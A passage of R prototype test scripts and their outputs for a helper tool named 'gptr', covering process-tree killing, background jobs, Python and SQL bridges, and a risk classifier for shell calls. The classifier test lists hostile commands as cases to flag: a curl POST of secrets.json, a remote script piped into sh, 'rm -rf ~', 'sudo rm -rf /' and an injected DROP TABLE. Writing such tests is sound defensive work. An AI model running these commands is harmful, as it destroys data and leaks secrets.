  left = processx::run("pgrep", c("-f", "sleep 3[01]"), error_on_status = FALSE)$stdout
  cat(sprintf("%-28s kill_tree returned %-30s alive=%s leftovers=%s\n", label,
              paste(deparse(k), collapse = ""), p$is_alive(), gsub("\n", ",", left)))
  processx::run("pkill", c("-f", "sleep 3[01]"), error_on_status = FALSE)
}
e = Sys.getenv(); e = setNames(as.character(e), names(e))
try_kill("env = NULL", NULL)
try_kill("env = full named vector", e)
try_kill("env = c('current', X = '1')", c("current", NO_COLOR = "1"))
# arg encoding: UTF-8-marked argument in the C locale
z = "café"; Encoding(z) = "UTF-8"
f = tempfile(); p = processx::process$new("printf", c("%s\\n", z), stdout = f); p$wait()
cat("UTF-8-marked arg in", Sys.getlocale("LC_CTYPE"), "locale -> child bytes:", paste(readBin(f, "raw", 20), collapse = " "), "\n")
````

### `p04c_killtree.out`

````text
env = NULL                   kill_tree returned structure(integer(0), names = character(0)) alive=TRUE leftovers=37808,37809,37810,
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

env = full named vector      kill_tree returned structure(integer(0), names = character(0)) alive=TRUE leftovers=37815,37816,37817,
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

env = c('current', X = '1')  kill_tree returned structure(integer(0), names = character(0)) alive=TRUE leftovers=37822,37823,37824,
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

UTF-8-marked arg in C locale -> child bytes: 63 61 66 3c 55 2b 30 30 45 39 3e 0a 
````

### `p04d_killtree2.R`

````r
chk = function(label, cmd, args) {
  p = processx::process$new(cmd, args, cleanup_tree = TRUE)
  Sys.sleep(0.6)
  pid = p$get_pid()
  envr = tryCatch({ e = ps::ps_environ(ps::ps_handle(pid)); sprintf("readable (%d vars)", length(e)) },
                  error = function(e) paste("ps_environ ERROR:", class(e)[1]))
  pg = tryCatch(ps::ps_handle(pid), error = function(e) NULL)
  k = p$kill_tree()
  Sys.sleep(0.4)
  cat(sprintf("%-34s environ %-32s kill_tree killed %d pid(s); child alive after: %s\n",
              label, envr, length(k), p$is_alive()))
  if (p$is_alive()) p$kill()
}
chk("/bin/bash -c 'sleep 30 & wait'", "/bin/bash", c("-c", "sleep 30 & wait"))
chk("/bin/sleep 30", "/bin/sleep", "30")
chk("python3 (homebrew) sleep", Sys.which("python3"), c("-c", "import time; time.sleep(30)"))
chk("Rscript -e Sys.sleep(30)", file.path(R.home("bin"), "Rscript"), c("-e", "Sys.sleep(30)"))
chk("python3 spawning /bin/sleep", Sys.which("python3"),
    c("-c", "import subprocess,time; subprocess.Popen(['/bin/sleep','31']); time.sleep(30)"))
Sys.sleep(0.3)
cat("left over sleeps:", gsub("\n", ",", processx::run("pgrep", c("-fl", "sleep 3[01]"), error_on_status = FALSE)$stdout), "\n")
processx::run("pkill", c("-f", "sleep 3[01]"), error_on_status = FALSE)

# process-group kill: is the child a process-group leader?
p = processx::process$new("/bin/bash", c("-c", "sleep 30 & sleep 31; wait"))
Sys.sleep(0.5)
pid = p$get_pid()
pgid = processx::run("ps", c("-o", "pgid=", "-p", pid))$stdout
cat("child pid", pid, "pgid", trimws(pgid), "(leader:", identical(as.integer(trimws(pgid)), pid), ")\n")
tools::pskill(-pid, tools::SIGKILL)
Sys.sleep(0.4)
cat("after pskill(-pid): alive =", p$is_alive(), " leftovers:",
    gsub("\n", ",", processx::run("pgrep", c("-f", "sleep 3[01]"), error_on_status = FALSE)$stdout), "\n")
````

### `p04d_killtree2.out`

````text
/bin/bash -c 'sleep 30 & wait'     environ readable (0 vars)                kill_tree killed 0 pid(s); child alive after: TRUE
[1] TRUE
/bin/sleep 30                      environ readable (0 vars)                kill_tree killed 0 pid(s); child alive after: TRUE
[1] TRUE
python3 (homebrew) sleep           environ readable (95 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
Rscript -e Sys.sleep(30)           environ readable (94 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
python3 spawning /bin/sleep        environ readable (95 vars)               kill_tree killed 1 pid(s); child alive after: FALSE
left over sleeps: 37988 /bin/sleep 31, 
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

child pid 37993 pgid 37993 (leader: TRUE )
after pskill(-pid): alive = TRUE  leftovers: 37993,37994,37995, 
````

### `p04e_kill.R`

````r
left = function() gsub("\n", ",", processx::run("pgrep", c("-f", "sleep 3[01]"), error_on_status = FALSE)$stdout)
clean = function() invisible(processx::run("pkill", c("-f", "sleep 3[01]"), error_on_status = FALSE))
start = function() { p = processx::process$new("/bin/bash", c("-c", "sleep 30 & sleep 31; wait"), cleanup_tree = TRUE); Sys.sleep(0.5); p }

p = start(); p$kill(); Sys.sleep(0.4)
cat("p$kill():                        alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

p = start(); p$kill_tree(); p$kill(); Sys.sleep(0.4)
cat("p$kill_tree(); p$kill():         alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

p = start(); pid = p$get_pid()
r = tools::pskill(-pid, tools::SIGKILL); Sys.sleep(0.4)
cat("tools::pskill(-pid) returned", r, "  alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

p = start(); pid = p$get_pid()
processx::run("/bin/kill", c("-KILL", "--", paste0("-", pid)), error_on_status = FALSE); Sys.sleep(0.4)
cat("/bin/kill -KILL -- -pgid:        alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

# python child that starts a platform-binary grandchild in the same group
p = processx::process$new(Sys.which("python3"), c("-c", "import subprocess,time; subprocess.Popen(['/bin/sleep','31']); time.sleep(30)"), cleanup_tree = TRUE)
Sys.sleep(0.6); p$kill_tree(); p$kill(); Sys.sleep(0.4)
cat("python+sleep: kill_tree + kill:   alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

p = processx::process$new(Sys.which("python3"), c("-c", "import subprocess,time; subprocess.Popen(['/bin/sleep','31']); time.sleep(30)"), cleanup_tree = TRUE)
Sys.sleep(0.6); pid = p$get_pid()
processx::run("/bin/kill", c("-KILL", "--", paste0("-", pid)), error_on_status = FALSE); p$kill_tree(); Sys.sleep(0.4)
cat("python+sleep: kill -pgid + tree: alive =", p$is_alive(), " leftovers:", left(), "\n"); clean()

# a grandchild that escapes into its own session (setsid) survives group kill: only kill_tree could catch it
p = processx::process$new(Sys.which("python3"), c("-c", "import subprocess,time; subprocess.Popen(['/bin/sleep','31'], start_new_session=True); time.sleep(30)"), cleanup_tree = TRUE)
Sys.sleep(0.6); pid = p$get_pid()
processx::run("/bin/kill", c("-KILL", "--", paste0("-", pid)), error_on_status = FALSE); p$kill_tree(); Sys.sleep(0.4)
cat("setsid grandchild: kill -pgid + tree: leftovers:", left(), "\n"); clean()
````

### `p04e_kill.out`

````text
[1] TRUE
p$kill():                        alive = FALSE  leftovers:  
named integer(0)
[1] TRUE
p$kill_tree(); p$kill():         alive = FALSE  leftovers:  
tools::pskill(-pid) returned FALSE   alive = TRUE  leftovers: 38128,38129,38130, 
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

/bin/kill -KILL -- -pgid:        alive = FALSE  leftovers:  
Python 
 38152 
[1] TRUE
python+sleep: kill_tree + kill:   alive = FALSE  leftovers:  
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

named integer(0)
python+sleep: kill -pgid + tree: alive = FALSE  leftovers:  
$status
[1] 0

$stdout
[1] ""

$stderr
[1] ""

$timeout
[1] FALSE

named integer(0)
setsid grandchild: kill -pgid + tree: leftovers: 38176, 
````

### `p05_bg_interrupt.R`

````r
# G5 prototype test 5: background jobs (start, poll, incremental read, wait-until, stdin, kill)
# and Ctrl-C during a foreground helper (driver sends SIGINT to a child R process).
source("g5_helpers.R")
ok = function(label, cond) cat(sprintf("[%s] %s\n", if (isTRUE(cond)) "PASS" else "FAIL", label))
left = function(pat) processx::run("pgrep", c("-f", pat), error_on_status = FALSE)$stdout

cat("--- a long-running job with progress output ---\n")
j = gptr$bg(c("python3", "-u", "-c",
  "import time\nfor i in range(1, 9):\n  print(f'epoch {i}/8 loss={1/i:.3f}', flush=True); time.sleep(0.4)\nprint('DONE acc=0.93')"))
print(j)
Sys.sleep(1)
r1 = j$read(); print(r1)
r2 = j$read(); print(r2)
ok("second read returns only new output (none yet or a few lines)", length(r2) <= 3L)
r3 = j$wait(timeout = 10, until = "DONE")
print(r3)
ok("wait(until =) returned once DONE appeared", any(grepl("DONE acc=0.93", r3)))
print(gptr$jobs())

cat("\n--- a server-like job: wait until ready, talk to it over stdin, kill ---\n")
srv = gptr$bg(c("python3", "-u", "-c",
  "import sys\nprint('ready', flush=True)\nfor line in sys.stdin:\n  print('echo:', line.strip()[::-1], flush=True)"),
  stdin = TRUE, name = "echo_srv")
print(srv$wait(timeout = 5, until = "ready"))
srv$write(c("hello", "gptr"))
print(srv$wait(timeout = 5, until = "echo: rtpg"))
big = strrep("x", 200000)                        # larger than the pipe buffer: exercises the write loop
srv$write(big)
out = srv$wait(timeout = 5, until = "echo: x{1000}")
ok("200 KB written through the non-blocking write loop", any(grepl("echo: x", out)))
srv$kill(); Sys.sleep(0.3)
ok("killed job is not running", identical(srv$status() == "running", FALSE))
print(gptr$jobs())

cat("\n--- Ctrl-C during a foreground gptr$sh(): the whole tree must die ---\n")
drv = tempfile(fileext = ".R")
writeLines(c(
  sprintf("setwd(%s)", deparse(getwd())),
  "source('g5_helpers.R')",
  "res = tryCatch(gptr$sh('sleep 37 & sleep 38; wait', timeout = 60),",
  "               interrupt = function(e) 'INTERRUPTED')",
  "cat('child R saw:', if (is.character(res)) res else 'result', '\\n')"), drv)
child = processx::process$new(file.path(R.home("bin"), "Rscript"), c("--vanilla", drv),
                              stdout = "|", stderr = "2>&1")
Sys.sleep(2)
cat("before SIGINT, sleeps alive:", gsub("\n", ",", left("sleep 3[78]")), "\n")
child$signal(tools::SIGINT)
child$wait(5000)
Sys.sleep(0.5)
cat(child$read_all_output())
ok("no sleep 37/38 left after Ctrl-C", !nzchar(left("sleep 3[78]")))
````

### `p05_bg_interrupt.out`

````text
--- a long-running job with progress output ---
<job1> running, 0s, pid 38976, 0B unread; cmd: python3 -u -c import time
for i in range(1, 9):
  print(f'epoch {i}/8 loss={1/i:.3f}', flush=True); time.sleep(0.4)
print('DONE acc=0.93')
epoch 1/8 loss=1.000
epoch 2/8 loss=0.500
epoch 3/8 loss=0.333
[job1 running, 1s]
[job1 running; no new output]
[PASS] second read returns only new output (none yet or a few lines)
epoch 4/8 loss=0.250
epoch 5/8 loss=0.200
epoch 6/8 loss=0.167
epoch 7/8 loss=0.143
epoch 8/8 loss=0.125
DONE acc=0.93
[job1 exited 0, 3s]
[PASS] wait(until =) returned once DONE appeared
    id   status                                       cmd
1 job1 exited 0 python3 -u -c import time\nfor i in range

--- a server-like job: wait until ready, talk to it over stdin, kill ---
ready
[echo_srv running, 0s]
echo: olleh
echo: rtpg
[echo_srv running, 0s]
[PASS] 200 KB written through the non-blocking write loop
[PASS] killed job is not running
        id    status                                       cmd
1     job1  exited 0 python3 -u -c import time\nfor i in range
2 echo_srv exited -9 python3 -u -c import sys\nprint('ready', 

--- Ctrl-C during a foreground gptr$sh(): the whole tree must die ---
before SIGINT, sleeps alive: 39062,39063,39064, 
[1] TRUE
child R saw: INTERRUPTED 
[PASS] no sleep 37/38 left after Ctrl-C
````

### `p06_py.R`

````r
# G5 prototype test 6: gptr$py() -- persistent objects, data-frame exchange, captured prints,
# REPL-style last value with pandas-bounded repr, compact errors, copy-safety of passed objects.
source("g5_helpers.R")
ok = function(label, cond) cat(sprintf("[%s] %s\n", if (isTRUE(cond)) "PASS" else "FAIL", label))

cat("python configured by RETICULATE_PYTHON =", Sys.getenv("RETICULATE_PYTHON"), "\n")
cat("initialised before first call:", reticulate::py_available(initialize = FALSE), "\n\n")

cat("--- statements, prints and a persistent object ---\n")
print(gptr$py("import pandas as pd\ncounter = 41\nprint('hello from python')"))
r = gptr$py("counter += 1\ncounter")
print(r); ok("object persisted across calls", identical(r$value, 42L))

cat("\n--- data frame in, bounded repr out, R value back ---\n")
set.seed(7)
sales = data.frame(region = sample(c("north", "south", "east", "west"), 5000, TRUE),
                   month = sample(1:12, 5000, TRUE), revenue = round(rexp(5000, 1 / 100), 2))
r = gptr$py("t = sales.groupby(['region','month']).revenue.sum().unstack().round(0)\nt", sales = sales)
print(r)
tab = r$value
ok("pandas result converted back to an R data.frame", is.data.frame(tab) && identical(dim(tab), c(4L, 12L)))
big = gptr$py("sales")
cat(sprintf("repr of the 5000-row frame printed as %d lines\n", length(format(big))))

cat("\n--- Python error: compact, no R error, session continues ---\n")
r = gptr$py("x = 1\ny = undefined_name + x")
print(r); ok("error captured as text", !is.null(r$error) && grepl("NameError", r$error))
r = gptr$py("def f(:\n  pass")
print(r); ok("syntax error is one line", grepl("^SyntaxError", r$error) && !grepl("\n", r$error))
ok("statements before the error ran", identical(gptr$py("x")$value, 1L))

cat("\n--- stderr and warnings are captured ---\n")
print(gptr$py("import warnings, sys\nsys.stderr.write('to stderr\\n')\nwarnings.warn('careful')"))

cat("\n--- reticulate's `r` object: Python can read R objects by name ---\n")
print(gptr$py("float(r.sales['revenue'].sum())"))
cat("R check:", sum(sales$revenue), "\n")

cat("\n--- copy-safety: does passing a big vector leave a sticky reference? ---\n")
v1 = runif(5e6); a1 = rlang::obj_address(v1)
invisible(gptr$py("s1 = float(v1.sum())", v1 = v1))           # Python keeps v1
v1[1] = 0
cat("kept in Python, then v1[1] = 0 in R -> copied:", !identical(a1, rlang::obj_address(v1)), "\n")
v2 = runif(5e6); a2 = rlang::obj_address(v2)
invisible(gptr$py("s2 = float(v2.sum())\ndel v2", v2 = v2))   # Python drops v2
invisible(reticulate::py_run_string("import gc; gc.collect()")); invisible(gc())
v2[1] = 0
cat("dropped by Python, then v2[1] = 0 in R -> copied:", !identical(a2, rlang::obj_address(v2)), "\n")
v3 = runif(5e6); a3 = rlang::obj_address(v3)
invisible(gptr$py("s3 = float(r.v3.sum())"))                   # access via the r object instead
v3[1] = 0
cat("read via r.v3 (not passed), then v3[1] = 0 -> copied:", !identical(a3, rlang::obj_address(v3)), "\n")

cat("\n--- knitr's python engine shares the same __main__ ---\n")
out = knitr::knit_engines$get("python")(knitr::opts_chunk$merge(list(
  engine = "python", code = "print(counter)", label = "k", echo = FALSE, results = "markup")))
cat(out, "\n")
ok("knitr python chunk sees objects created by gptr$py", grepl("42", paste(out, collapse = "")))
````

### `p06_py.out`

````text
python configured by RETICULATE_PYTHON = /opt/homebrew/bin/python3 
initialised before first call: FALSE 

--- statements, prints and a persistent object ---
hello from python
42
[PASS] object persisted across calls

--- data frame in, bounded repr out, R value back ---
month        1        2        3        4        5        6        7        8        9        10       11       12
region                                                                                                            
east    10868.0   9881.0   9350.0   8928.0  10379.0  10816.0  11247.0   7706.0  11555.0  11037.0  11143.0  10181.0
north   11357.0   9556.0  10673.0   9532.0  10789.0  11210.0   9377.0  11951.0  10999.0  10111.0   8227.0  12366.0
south   12159.0  13715.0   7748.0  11269.0  12785.0  10131.0   8607.0   9404.0  10432.0   9433.0  10100.0   7677.0
west    10249.0  10939.0  14191.0  10025.0   9541.0  13227.0  12497.0   8948.0   9696.0  11804.0   8440.0  10385.0
[PASS] pandas result converted back to an R data.frame
repr of the 5000-row frame printed as 14 lines

--- Python error: compact, no R error, session continues ---
[python error]
line 2: y = undefined_name + x
NameError: name 'undefined_name' is not defined
[PASS] error captured as text
[python error]
SyntaxError: invalid syntax (line 1: def f(:)
[PASS] syntax error is one line
[PASS] statements before the error ran

--- stderr and warnings are captured ---
[stderr]
to stderr
<gptr>:3: UserWarning: careful

--- reticulate's `r` object: Python can read R objects by name ---
502641.18
R check: 502641.2 

--- copy-safety: does passing a big vector leave a sticky reference? ---
kept in Python, then v1[1] = 0 in R -> copied: TRUE 
dropped by Python, then v2[1] = 0 in R -> copied: TRUE 
read via r.v3 (not passed), then v3[1] = 0 -> copied: FALSE 

--- knitr's python engine shares the same __main__ ---
## 42
 
[PASS] knitr python chunk sees objects created by gptr$py
````

### `p06b_sticky.R`

````r
Sys.setenv(RETICULATE_PYTHON = "/opt/homebrew/bin/python3")
reticulate::py_run_string("import numpy")
addr_changes = function(label, f) {
  v = runif(5e6); a = rlang::obj_address(v)
  f(v)
  invisible(reticulate::py_run_string("import gc; gc.collect()")); invisible(gc())
  v[1] = 0
  cat(sprintf("%-52s next in-place edit copies: %s\n", label, !identical(a, rlang::obj_address(v))))
}
addr_changes("nothing", function(v) NULL)
addr_changes("list(v) inside a closure", function(v) { l = list(v); NULL })
addr_changes("reticulate::r_to_py(v), dropped", function(v) { o = reticulate::r_to_py(v); rm(o); NULL })
addr_changes("r_to_py(v) assigned in __main__ then deleted", function(v) {
  m = reticulate::import_main(convert = FALSE); reticulate::py_set_attr(m, "vv", reticulate::r_to_py(v))
  reticulate::py_run_string("del vv"); NULL })
g = globalenv(); assign("gv", runif(5e6), envir = g); a = rlang::obj_address(g$gv)
reticulate::py_run_string("s = float(numpy.asarray(r.gv).sum())")
g$gv[1] = 0
cat(sprintf("%-52s next in-place edit copies: %s\n", "python reads r.gv (by name)", !identical(a, rlang::obj_address(g$gv))))
````

### `p06b_sticky.out`

````text
nothing                                              next in-place edit copies: FALSE
list(v) inside a closure                             next in-place edit copies: TRUE
reticulate::r_to_py(v), dropped                      next in-place edit copies: TRUE
r_to_py(v) assigned in __main__ then deleted         next in-place edit copies: FALSE
python reads r.gv (by name)                          next in-place edit copies: TRUE
````

### `p07_sql_knit.R`

````r
# G5 prototype test 7: gptr$sql() on a connection found in scope and on in-memory data frames
# (duckdb, zero-copy registration), bounded printing; gptr$knit() for other knitr engines.
source("g5_helpers.R")
ok = function(label, cond) cat(sprintf("[%s] %s\n", if (isTRUE(cond)) "PASS" else "FAIL", label))
.libPaths(c("/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib", .libPaths()))

run_in = function() {        # a function frame standing in for the user's workspace
  set.seed(3)
  orders = data.frame(id = 1:20000, region = sample(c("north", "south", "east", "west"), 20000, TRUE),
                      amount = round(rlnorm(20000, 4, 1), 2))
  db = tempfile(fileext = ".sqlite")
  shop = DBI::dbConnect(RSQLite::SQLite(), db)
  DBI::dbWriteTable(shop, "orders", orders)

  cat("--- connection found in scope (exactly one DBIConnection binding) ---\n")
  hits = find_connection(environment())
  cat("found:", hits, "\n")
  x = gptr$sql("SELECT * FROM orders WHERE amount > 100")
  print(x)
  ok("all rows fetched into the value, only 10 printed", nrow(x) > 1000)
  agg = gptr$sql("-- revenue by region\nSELECT region, COUNT(*) AS n, ROUND(AVG(amount), 2) AS avg
                  FROM orders GROUP BY region ORDER BY n DESC")
  print(agg)
  print(gptr$sql("UPDATE orders SET amount = amount WHERE id < 5"))

  cat("\n--- two connections in scope: explicit con = required ---\n")
  other = DBI::dbConnect(RSQLite::SQLite(), ":memory:")
  e = tryCatch(gptr$sql("SELECT 1"), error = function(e) conditionMessage(e))
  cat(e, "\n")
  ok("ambiguity is an error naming the candidates", grepl("shop", e) && grepl("other", e))
  DBI::dbDisconnect(other)

  cat("\n--- SQL over in-memory data frames through duckdb (no copy into a database) ---\n")
  big = data.frame(g = sample(letters[1:5], 2e6, TRUE), v = runif(2e6))
  a0 = rlang::obj_address(big$v)
  t0 = proc.time()[["elapsed"]]
  r = gptr$sql("SELECT g, COUNT(*) AS n, AVG(v) AS mean_v FROM big GROUP BY g ORDER BY g", big = big)
  cat(sprintf("duckdb over a 2e6-row data frame: %.2fs\n", proc.time()[["elapsed"]] - t0))
  print(r)
  ok("column vector not copied by registration", identical(a0, rlang::obj_address(big$v)))
  big$v[1] = 0
  cat("next in-place edit of big$v copies:", !identical(a0, rlang::obj_address(big$v)), "\n")
  DBI::dbDisconnect(shop)
}
run_in()

cat("\n--- knitr engines: native bridges for bash/python/sql, knitr for the rest ---\n")
print(gptr$knit("bash", "echo \"from bash: $((6 * 7))\""))
print(gptr$knit("perl", "print \"from perl: \", 6 * 7, \"\\n\";"))
print(gptr$knit("ruby", "puts \"from ruby: #{6 * 7}\""))
print(gptr$knit("node", "console.log('from node:', 6 * 7)"))
e = tryCatch(gptr$knit("nosuch", "x"), error = function(e) conditionMessage(e))
cat(e, "\n")
cat("knitr engines available:", length(knitr::knit_engines$get()), "\n")
````

### `p07_sql_knit.out`

````text
--- connection found in scope (exactly one DBIConnection binding) ---
found: shop 
# 5,417 rows x 3 cols
 id region amount
  5   west 284.56
 10   west 264.04
 14   west 384.03
 16   west 157.99
 17   west 121.69
 18  north 714.01
 19  south 171.62
 20  north 388.61
 21   west 242.84
 22  north 259.60
# ... 5,407 more rows (all fetched rows are in the value)
[PASS] all rows fetched into the value, only 10 printed
# 4 rows x 3 cols
 region    n   avg
   west 5099 89.40
  south 5035 91.11
  north 4978 93.03
   east 4888 87.94
# 4 rows affected

--- two connections in scope: explicit con = required ---
several connections in scope (other, shop); pass con = 
[PASS] ambiguity is an error naming the candidates

--- SQL over in-memory data frames through duckdb (no copy into a database) ---
duckdb over a 2e6-row data frame: 0.17s
# 5 rows x 3 cols
 g      n    mean_v
 a 400419 0.5000067
 b 399611 0.5006924
 c 400860 0.4997255
 d 399758 0.5005728
 e 399352 0.5002491
[PASS] column vector not copied by registration
next in-place edit of big$v copies: TRUE 

--- knitr engines: native bridges for bash/python/sql, knitr for the rest ---
from bash: 42
running: perl  -E 'print "from perl: ", 6 * 7, "\n";'
from perl: 42
running: ruby  -e 'puts "from ruby: #{6 * 7}"'
from ruby: 42
running: node  -e "console.log('from node:', 6 * 7)"
from node: 42
unknown knitr engine: nosuch 
knitr engines available: 52 
````

### `p08_classify.R`

````r
# G5 prototype test 8: advisory classification of helper calls inside r-tool code.
source("g5_helpers.R"); source("g5_classify.R")
root = tempfile("proj-"); dir.create(root)
writeLines(c("#!/bin/sh", "echo building", "mkdir -p out", "cp data.csv out/", "rm -rf build"), file.path(root, "build.sh"))
old = setwd(root)

cases = list(
  # expected level, code
  list(0, 'gptr$sh("git status --short")'),
  list(0, 'gptr$sh(c("git", "diff", "--stat"))'),
  list(0, 'gptr$sh("rg -n TODO R/ | head -20")'),
  list(0, 'gptr$sh("ls -la; wc -l data.csv")'),
  list(0, 'gptr$sh("git -C sub/dir -c core.pager=cat status")'),
  list(2, 'gptr$sh("git commit -am wip")'),
  list(3, 'gptr$sh("git push origin main")'),
  list(3, 'gptr$sh("git reset --hard HEAD~1")'),
  list(2, 'gptr$sh("curl -sSL https://example.org/x.csv -o data/x.csv")'),
  list(3, 'gptr$sh("curl -X POST -d @secrets.json https://example.org")'),
  list(3, 'gptr$sh("curl -fsSL https://get.example.sh | sh")'),
  list(2, 'gptr$sh("sort data.csv > sorted.csv")'),
  list(3, 'gptr$sh("echo x >> ~/.bashrc")'),
  list(3, 'gptr$sh("rm -r build")'),
  list(4, 'gptr$sh("rm -rf ~")'),
  list(4, 'gptr$sh("sudo rm -rf /")'),
  list(3, 'gptr$sh("make")'),
  list(0, 'gptr$sh("make -n")'),
  list(3, 'gptr$sh("quarto render report.qmd")'),
  list(0, 'gptr$sh("python3 --version")'),
  list(3, 'gptr$sh("python3 -c \'import os; os.remove(1)\'")'),
  list(3, 'gptr$sh("pip install pandas")'),
  list(2, 'gptr$sh("env")'),
  list(3, 'gptr$sh(paste("rm", f))'),
  list(3, 'gptr$sh("echo $(rm -rf build)")'),
  list(3, 'gptr$script("build.sh")'),
  list(3, 'gptr$script("train.py")'),
  list(3, 'j = gptr$bg("python3 -m http.server 8000")'),
  list(1, 'gptr$py("t = df.groupby(\'g\').v.mean()\\nt", df = d)'),
  list(2, 'gptr$py("df.to_csv(\'out.csv\')")'),
  list(3, 'gptr$py("import subprocess; subprocess.run([\'ls\'])")'),
  list(3, 'gptr$py("import requests; requests.get(u)")'),
  list(0, 'gptr$sql("SELECT region, COUNT(*) FROM orders GROUP BY region")'),
  list(0, 'x = gptr$sql("WITH t AS (SELECT * FROM o) SELECT * FROM t", con = shop)'),
  list(2, 'gptr$sql("UPDATE orders SET amount = 0 WHERE id = 1")'),
  list(3, 'gptr$sql("DROP TABLE orders")'),
  list(3, 'gptr$sql("SELECT 1; DROP TABLE orders")'),
  list(3, 'gptr$sql("COPY orders TO \'/tmp/o.parquet\'")'),
  list(2, 'gptr$sql("SELECT * FROM read_csv(\'https://x.org/a.csv\')")'),
  list(0, 'gptr$knit("bash", "wc -l *.csv")'),
  list(3, 'gptr$knit("perl", "print 1")'),
  list(0, 'system2("git", c("log", "-1"))'),
  list(3, 'system("rm -rf build")'),
  list(0, 'processx::run("git", "status")'),
  list(0, 'gptr::gptr$sh("git log -3 --oneline")'),
  list(0, 'n = length(gptr$sh("git ls-files")$stdout); if (n > 100) gptr$sh("git status")')
)
pass = 0
for (cs in cases) {
  f = gptr_classify_bridges(cs[[2]], root)
  lv = if (nrow(f)) max(f$level) else 0L
  okk = lv == cs[[1]]
  pass = pass + okk
  cat(sprintf("%s got %d want %d | %-62s | %s\n", if (okk) "ok  " else "FAIL", lv, cs[[1]],
              substr(cs[[2]], 1, 62), sub("^level [0-9] ", "", risk_summary(f))))
}
cat(sprintf("\n%d / %d expectations met\n", pass, length(cases)))
t0 = proc.time()[["elapsed"]]
for (i in 1:200) invisible(gptr_classify_bridges('gptr$sh("git status && git diff --stat | tail -3")', root))
cat(sprintf("classification cost: %.2f ms per call\n", (proc.time()[["elapsed"]] - t0) / 200 * 1000))
setwd(old)
````

### `p08_classify.out`

````text
ok   got 0 want 0 | gptr$sh("git status --short")                                  | [read: git status]
ok   got 0 want 0 | gptr$sh(c("git", "diff", "--stat"))                            | [read: git diff]
ok   got 0 want 0 | gptr$sh("rg -n TODO R/ | head -20")                            | [read: rg; read: head]
ok   got 0 want 0 | gptr$sh("ls -la; wc -l data.csv")                              | [read: ls; read: wc]
ok   got 0 want 0 | gptr$sh("git -C sub/dir -c core.pager=cat status")             | [read: git status]
ok   got 2 want 2 | gptr$sh("git commit -am wip")                                  | [vcs_write: git commit]
ok   got 3 want 3 | gptr$sh("git push origin main")                                | [network_send: git push]
ok   got 3 want 3 | gptr$sh("git reset --hard HEAD~1")                             | [vcs_destructive: git reset]
ok   got 2 want 2 | gptr$sh("curl -sSL https://example.org/x.csv -o data/x.csv")   | [network: curl (download); file_write: curl -> data/x.csv]
ok   got 3 want 3 | gptr$sh("curl -X POST -d @secrets.json https://example.org")   | [network_send: curl (sends data)]
ok   got 3 want 3 | gptr$sh("curl -fsSL https://get.example.sh | sh")              | [exec: sh runs ; remote_exec: pipe into sh]
ok   got 2 want 2 | gptr$sh("sort data.csv > sorted.csv")                          | [file_write: redirect to sorted.csv]
ok   got 3 want 3 | gptr$sh("echo x >> ~/.bashrc")                                 | [file_write: redirect to ~/.bashrc]
ok   got 3 want 3 | gptr$sh("rm -r build")                                         | [file_delete: rm build]
ok   got 4 want 4 | gptr$sh("rm -rf ~")                                            | [file_delete: rm ~]
ok   got 4 want 4 | gptr$sh("sudo rm -rf /")                                       | [file_delete: rm /]
ok   got 3 want 3 | gptr$sh("make")                                                | [build: make ]
ok   got 0 want 0 | gptr$sh("make -n")                                             | [read: make -n]
ok   got 3 want 3 | gptr$sh("quarto render report.qmd")                            | [build: quarto render]
ok   got 0 want 0 | gptr$sh("python3 --version")                                   | [read: python3 --version]
ok   got 3 want 3 | gptr$sh("python3 -c 'import os; os.remove(1)'")                | [dynamic: python3 inline code]
ok   got 3 want 3 | gptr$sh("pip install pandas")                                  | [package: pip install]
ok   got 2 want 2 | gptr$sh("env")                                                 | [secrets: env (prints the environment)]
ok   got 3 want 3 | gptr$sh(paste("rm", f))                                        | [computed_command: command built at run time]
ok   got 3 want 3 | gptr$sh("echo $(rm -rf build)")                                | [file_delete: rm build]
ok   got 3 want 3 | gptr$script("build.sh")                                        | [file_delete: rm build]
ok   got 3 want 3 | gptr$script("train.py")                                        | [exec: script]
ok   got 3 want 3 | j = gptr$bg("python3 -m http.server 8000")                     | [exec: python3 runs http.server]
ok   got 1 want 1 | gptr$py("t = df.groupby('g').v.mean()\nt", df = d)             | [python_state: runs Python in the persistent session]
ok   got 2 want 2 | gptr$py("df.to_csv('out.csv')")                                | [file_write: file_write]
ok   got 3 want 3 | gptr$py("import subprocess; subprocess.run(['ls'])")           | [process: process]
ok   got 3 want 3 | gptr$py("import requests; requests.get(u)")                    | [network: network]
ok   got 0 want 0 | gptr$sql("SELECT region, COUNT(*) FROM orders GROUP BY region" | [read: SELECT statement]
ok   got 0 want 0 | x = gptr$sql("WITH t AS (SELECT * FROM o) SELECT * FROM t", co | [read: WITH statement]
ok   got 2 want 2 | gptr$sql("UPDATE orders SET amount = 0 WHERE id = 1")          | [db_write: UPDATE statement]
ok   got 3 want 3 | gptr$sql("DROP TABLE orders")                                  | [db_write: DROP statement]
ok   got 3 want 3 | gptr$sql("SELECT 1; DROP TABLE orders")                        | [db_write: DROP statement]
ok   got 3 want 3 | gptr$sql("COPY orders TO '/tmp/o.parquet'")                    | [db_write: COPY statement]
ok   got 2 want 2 | gptr$sql("SELECT * FROM read_csv('https://x.org/a.csv')")      | [network: reads a URL]
ok   got 0 want 0 | gptr$knit("bash", "wc -l *.csv")                               | [read: wc]
ok   got 3 want 3 | gptr$knit("perl", "print 1")                                   | [exec: knitr engine perl]
ok   got 0 want 0 | system2("git", c("log", "-1"))                                 | [read: system2(): git log]
ok   got 3 want 3 | system("rm -rf build")                                         | [file_delete: system(): rm build]
ok   got 0 want 0 | processx::run("git", "status")                                 | [read: run(): git status]
ok   got 0 want 0 | gptr::gptr$sh("git log -3 --oneline")                          | [read: git log]
